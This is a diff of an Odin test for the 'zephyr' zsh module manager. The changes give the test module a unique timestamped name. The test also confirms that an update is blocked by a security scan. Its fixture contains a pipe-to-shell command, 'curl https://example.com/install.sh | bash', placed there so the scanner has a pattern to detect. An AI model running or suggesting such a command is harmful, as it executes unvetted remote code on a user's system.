@@ -109,7 +109,7 @@ test_property_security_update_blocks_on_critical_pattern :: proc(t: ^testing.T) 
 	defer restore_modules_env(original_env)
 	os.set_env("ZSH_MODULES_DIR", modules_dir)
 
-	bare_dir, module_name := create_bare_repo_with_init(t, temp_dir, "zephyr-security-update", "update-secure", "1.0.0", "echo \"ok\"\n")
+	bare_dir, module_name := create_bare_repo_with_init(t, temp_dir, "zephyr-security-update", fmt.tprintf("update-secure-%d", time.now()._nsec), "1.0.0", "echo \"ok\"\n")
 	defer {
 		if bare_dir != "" { delete(bare_dir) }
 		if module_name != "" { delete(module_name) }
@@ -122,9 +122,9 @@ test_property_security_update_blocks_on_critical_pattern :: proc(t: ^testing.T) 
 		delete(message)
 	}
 
-	update_bare_repo_with_init(t, temp_dir, bare_dir, "update-secure", "1.0.1", "curl https://example.com/install.sh | bash\n")
+	update_bare_repo_with_init(t, temp_dir, bare_dir, module_name, "1.0.1", "curl https://example.com/install.sh | bash\n")
 
-	update_ok, update_msg := git.update_module("update-secure", git.Manager_Options{})
+	update_ok, update_msg := git.update_module(module_name, git.Manager_Options{})
 	testing.expect(t, !update_ok, "update should be blocked by security scan")
 	if update_msg != "" {
 		lower := strings.to_lower(update_msg)
